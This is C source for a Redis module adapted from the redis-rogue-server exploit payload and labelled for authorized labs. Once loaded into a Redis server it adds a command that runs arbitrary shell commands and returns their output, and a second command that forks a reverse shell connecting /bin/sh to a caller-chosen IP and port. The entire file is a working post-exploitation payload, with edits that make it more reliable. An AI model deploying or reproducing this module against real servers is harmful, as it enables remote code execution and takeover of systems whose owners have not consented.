/* Redis command module for authorized labs.
 * Refined from n0b0dyCN/redis-rogue-server's exp.c (Apache-2.0).
 * Changes by Zhaoyi Fan: corrected memory handling and command arguments,
 * validated reverse-shell inputs, and kept the Redis process alive on fork.
 */
#include "redismodule.h"

#include <arpa/inet.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

static int reply_error(RedisModuleCtx *ctx, const char *message) {
    RedisModule_ReplyWithError(ctx, message);
    return REDISMODULE_OK;
}

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2)
        return RedisModule_WrongArity(ctx);

    size_t cmd_len;
    const char *cmd_data = RedisModule_StringPtrLen(argv[1], &cmd_len);
    if (cmd_len == 0 || memchr(cmd_data, '\0', cmd_len) != NULL)
        return reply_error(ctx, "ERR invalid command");

    char *cmd = malloc(cmd_len + 1);
    if (cmd == NULL)
        return reply_error(ctx, "ERR allocation failed");
    memcpy(cmd, cmd_data, cmd_len);
    cmd[cmd_len] = '\0';

    FILE *pipe = popen(cmd, "r");
    free(cmd);
    if (pipe == NULL)
        return reply_error(ctx, "ERR popen failed");

    size_t cap = 1024;
    size_t used = 0;
    char *output = malloc(cap);
    if (output == NULL) {
        pclose(pipe);
        return reply_error(ctx, "ERR allocation failed");
    }

    char buf[1024];
    while (fgets(buf, sizeof buf, pipe) != NULL) {
        size_t n = strlen(buf);
        if (n > SIZE_MAX - used - 1) {
            free(output);
            pclose(pipe);
            return reply_error(ctx, "ERR output too large");
        }
        size_t needed = used + n + 1;
        if (needed > cap) {
            char *tmp = realloc(output, needed);
            if (tmp == NULL) {
                free(output);
                pclose(pipe);
                return reply_error(ctx, "ERR allocation failed");
            }
            output = tmp;
            cap = needed;
        }
        memcpy(output + used, buf, n);
        used += n;
    }

    int read_failed = ferror(pipe);
    pclose(pipe);
    if (read_failed) {
        free(output);
        return reply_error(ctx, "ERR reading command output failed");
    }

    RedisModule_ReplyWithStringBuffer(ctx, output, used);
    free(output);
    return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 3)
        return RedisModule_WrongArity(ctx);

    size_t ip_len;
    const char *ip_data = RedisModule_StringPtrLen(argv[1], &ip_len);
    if (ip_len == 0 || ip_len >= INET_ADDRSTRLEN ||
        memchr(ip_data, '\0', ip_len) != NULL)
        return reply_error(ctx, "ERR use a numeric IPv4 address");

    char ip[INET_ADDRSTRLEN];
    memcpy(ip, ip_data, ip_len);
    ip[ip_len] = '\0';

    long long port;
    if (RedisModule_StringToLongLong(argv[2], &port) != REDISMODULE_OK ||
        port < 1 || port > 65535)
        return reply_error(ctx, "ERR invalid port");

    struct sockaddr_in address = {0};
    address.sin_family = AF_INET;
    address.sin_port = htons((uint16_t)port);
    if (inet_pton(AF_INET, ip, &address.sin_addr) != 1)
        return reply_error(ctx, "ERR use a numeric IPv4 address");

    pid_t child = fork();
    if (child < 0)
        return reply_error(ctx, "ERR fork failed");
    if (child == 0) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0)
            _exit(1);
        if (connect(fd, (struct sockaddr *)&address, sizeof address) != 0)
            _exit(1);
        if (dup2(fd, STDIN_FILENO) < 0 ||
            dup2(fd, STDOUT_FILENO) < 0 ||
            dup2(fd, STDERR_FILENO) < 0)
            _exit(1);
        if (fd > STDERR_FILENO)
            close(fd);

        long max_fd = sysconf(_SC_OPEN_MAX);
        if (max_fd < 0)
            max_fd = 1024;
        if (max_fd > 65536)
            max_fd = 65536;
        for (long n = 3; n < max_fd; ++n)
            close((int)n);

        char *const shell_argv[] = {"/bin/sh", "-i", NULL};
        char *const shell_envp[] = {"PATH=/usr/bin:/bin", "TERM=xterm", NULL};
        execve("/bin/sh", shell_argv, shell_envp);
        _exit(127);
    }

    RedisModule_ReplyWithSimpleString(ctx, "OK");
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    (void)argv;
    (void)argc;

    if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    if (RedisModule_CreateCommand(ctx, "system.exec", DoCommand, "", 0, 0, 0)
        == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    if (RedisModule_CreateCommand(ctx, "system.rev", RevShellCommand, "", 0, 0, 0)
        == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    return REDISMODULE_OK;
}
